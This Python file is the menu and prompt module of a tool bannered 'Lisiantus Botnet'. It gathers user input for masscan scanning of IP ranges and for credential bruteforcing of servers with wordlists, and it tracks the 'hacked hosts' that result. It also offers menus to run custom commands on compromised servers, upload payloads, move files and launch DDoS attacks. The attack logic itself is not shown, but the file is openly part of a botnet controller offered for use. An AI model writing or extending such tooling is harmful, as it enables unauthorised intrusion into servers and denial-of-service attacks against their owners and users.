# -*- coding: utf-8 -*-
import subprocess

from libs import utils


MAIN_LOGO = """
$$\       $$\           $$\                      $$\                         
$$ |      \__|          \__|                     $$ |                        
$$ |      $$\  $$$$$$$\ $$\  $$$$$$\  $$$$$$$\ $$$$$$\   $$\   $$\  $$$$$$$\ 
$$ |      $$ |$$  _____|$$ | \____$$\ $$  __$$\\_$$  _|  $$ |  $$ |$$  _____|
$$ |      $$ |\$$$$$$\  $$ | $$$$$$$ |$$ |  $$ | $$ |    $$ |  $$ |\$$$$$$\  
$$ |      $$ | \____$$\ $$ |$$  __$$ |$$ |  $$ | $$ |$$\ $$ |  $$ | \____$$\ 
$$$$$$$$\ $$ |$$$$$$$  |$$ |\$$$$$$$ |$$ |  $$ | \$$$$  |\$$$$$$  |$$$$$$$  |
\________|\__|\_______/ \__| \_______|\__|  \__|  \____/  \______/ \_______/                                                                                                                                                   

$$$$$$$\             $$\                          $$\                        
$$  __$$\            $$ |                         $$ |                       
$$ |  $$ | $$$$$$\ $$$$$$\   $$$$$$$\   $$$$$$\ $$$$$$\                      
$$$$$$$\ |$$  __$$\\_$$  _|  $$  __$$\ $$  __$$\\_$$  _|                     
$$  __$$\ $$ /  $$ | $$ |    $$ |  $$ |$$$$$$$$ | $$ |                       
$$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$   ____| $$ |$$\                    
$$$$$$$  |\$$$$$$  | \$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$  |                   
\_______/  \______/   \____/ \__|  \__| \_______|  \____/   """


MAIN_MENU = """
0. Masscan              (Scan one or diapasons of ip's by specific port/s)
1. Bruteforce           (Bruteforce server/s by ip/s)
2. Send Command         (Send command to remote server. Available cmds: send custom cmd, upload/download file, ddos)

{}

Choose menu item...(1-6)
"""


MSG = """
Result of {}:
Total: {}
Elapsed: {}"""


def show_menu(msg=None):
    subprocess.run(['clear'])

    if msg:
        print(MAIN_LOGO + '\n' + MAIN_MENU.format(msg))
    else:
        print(MAIN_LOGO + '\n' + MAIN_MENU.format(''))


def masscan_start_msg():
    ip = input('[*] Input ip/range or path to file with hosts: ')
    port = input('[*] Input port/s (ex. 80 or 80,8080,22): ')
    subprocess.run(['clear'])

    return ip, port


def choose_bruteforce_type_msg():
    bruteforce_type_msg = """Enter type of bruteforce:
0. Basic bruteforce (Using low wordlists with usernames and passwords)
1. Medium bruteforce (Using low wordlist with usernames and medium wordlist with passwords)
2. Hardcore bruteforce (Using big wordlists with usernames and passwords.
3. Custom bruteforce (Set own ways to files with hosts, usernames and passwords)
"""
    bruteforce_type = input(bruteforce_type_msg + '> ')
    subprocess.run(['clear'])

    return bruteforce_type


def custom_bruteforce_type_msg():
    hosts = input('[*] Enter path to file with hosts: ')
    subprocess.run(['clear'])
    usernames = input('[*] Enter path to file with usernames: ')
    subprocess.run(['clear'])
    passwords = input('[*] Enter path to file with passwords: ')
    subprocess.run(['clear'])

    checked_data = utils.check_files(hosts=hosts, usernames=usernames, passwords=passwords)
    return checked_data


def bruteforce_start_msg(files_names):
    start_msg = """Enter your choice: 
0. Check masscan directory for files with hosts.
1. Enter own path to file with hosts.
"""
    choice = input(start_msg + '> ')
    subprocess.run(['clear'])
    chosen_hosts = None

    if choice == '0':
        if files_names:
            print('Available list of files for bruteforce.\n')

            for i in range(len(files_names)):
                print(f'{i}. {files_names[i]}')

            chosen_hosts = input('\n[*] Choose file with hosts from current list. (enter num): ')
            subprocess.run(['clear'])

        else:
            chosen_hosts = input('[*] Masscan directory with hosts is empty. Enter host ip or path to hosts file: ')
            subprocess.run(['clear'])

    elif choice == '1':
        chosen_hosts = input('[*] Enter host ip or path to file with hosts: ')
        subprocess.run(['clear'])

    bruteforce_type = choose_bruteforce_type_msg()

    if bruteforce_type == '3':
        checked_data = custom_bruteforce_type_msg()

        return chosen_hosts, checked_data

    return chosen_hosts, bruteforce_type


def bruteforce_result_msg(start, stop, hosts_am):
    msg = """Result of bruteforce:
Hacked hosts: {}
Start: {}
Stop: {} 
    """.format(hosts_am, start, stop)

    return msg


def send_command_start_msg():
    msg = """Available commands:
0. Send custom command to remote servers.
1. Upload payload to remote servers.
2. Download file from remote servers.
3. Upload file to remote servers.
4. Run DDos.  (experimental module)     
"""
    choice = input(f'{msg}: ')
    subprocess.run(['clear'])

    return choice


def send_command_custom_cmd(dirs_lst):
    print('Available directories with files of hacked hosts:')

    for i in range(len(dirs_lst)):
        print(f'{i}. {dirs_lst[i]}', '\n')

    choice = input('\n[*] Choose directory: ')
    cmd = input('[*] Input your command: ')
    log = input('[*] Is response logging required? [Y/n]')
    subprocess.run(['clear'])

    return choice, cmd, log

